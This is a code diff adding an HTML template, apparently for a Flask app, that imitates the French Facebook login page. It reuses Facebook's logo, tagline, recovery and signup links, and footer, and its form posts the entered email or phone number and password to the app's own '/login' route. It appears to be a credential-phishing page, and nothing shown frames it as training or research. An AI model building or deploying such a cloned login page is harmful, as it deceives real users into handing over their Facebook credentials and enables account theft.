@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <title>Connexion Facebook</title>
+  <link rel="stylesheet" href="{{ url_for('static',filename='css/style.css') }}">
+
+</head>
+<body>
+
+  <div class="header">
+    <img class="fb_logo" src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook">
+  </div>
+  <h2 class="_8eso">Avec Facebook, partagez et restez<br> en contact avec votre entourage.</h2>
+
+  <div class="login-container">
+    
+    <form action="/login" method="post">
+      <input type="text" name="username" placeholder="Adresse e-mail ou téléphone" required>
+      <input type="password" name="password" placeholder="Mot de passe" required>
+      <button type="submit">Se connecter</button>
+    </form>
+    <a href="https://web.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0">Mot de passe oublié&nbsp;?</a>
+    <a href="https://web.facebook.com/r.php?entry_point=login">Créer un nouveau compte</a>
+  </div>
+
+  <footer style="text-align: center;">Créer une Page pour une célébrité, une marque ou une<br>entreprise.<br><br>Français (France)
+English (US)
+العربية
+Español
+Italiano
+Deutsch
+Bahasa Indonesia
+Português (Brasil)
+हिन्दी
+中文(简体)
+日本語<br>S’inscrireSe connecterMessengerFacebook LiteVidéoMeta PayBoutique MetaMeta QuestRay-Ban MetaMeta AIInstagramThreadsCentre d’information sur les électionsPolitique de confidentialitéCentre de confidentialitéÀ proposCréer une publicitéCréer une PageDéveloppeursEmploisCookiesChoisir sa publicitéConditions généralesAideImportation des contacts et non-utilisateursParamètresHistorique d’activité
+Meta © 2025
+</footer>
+
+</body>
+</html>
